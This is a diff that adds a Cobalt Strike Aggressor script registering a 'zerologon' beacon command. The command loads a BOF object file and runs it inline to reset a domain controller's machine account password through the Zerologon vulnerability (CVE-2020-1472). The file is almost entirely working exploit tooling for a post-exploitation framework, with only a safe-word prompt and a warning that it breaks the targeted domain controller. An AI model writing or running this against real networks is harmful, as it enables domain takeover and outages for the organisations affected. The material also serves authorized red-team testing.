@@ -1,0 +1,33 @@
+alias zerologon {
+	local('$bid $barch $fqdn $netbios $args $safew');
+	($bid, $safew, $fqdn) = @_;
+	$netbios = split("\\.", $fqdn)[0];
+
+	# figure out the arch of this session
+	$barch   = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("zerologon. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	# build our arguments
+	$args    = bof_pack($1, "ZZZ", $fqdn, $netbios, $netbios . '$');
+
+	# safety check.
+	if ($safew ne "iunderstand") {
+		berror($1, "zerologon aborted! Type help zerologon and read first.");
+		return;
+	}
+
+	# announce what we're doing
+	btask($1, "Reset $netbios $+ \$ machine account via CVE-2020-1472");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+"zerologon", 
+"Reset DC machine account password with CVE-2020-1472", 
+"Synopsis: zerologon [safeword] [DC.fqdn]\n\nReset the machine account password for a domain controller with the\nZerologon exploit. \n\nThis exploit will break the functionality of this domain controller.\n\c4Don't use in production.\o Use \c0iunderstand\o as the safe word parameter\nto acknowledge that you read this.");
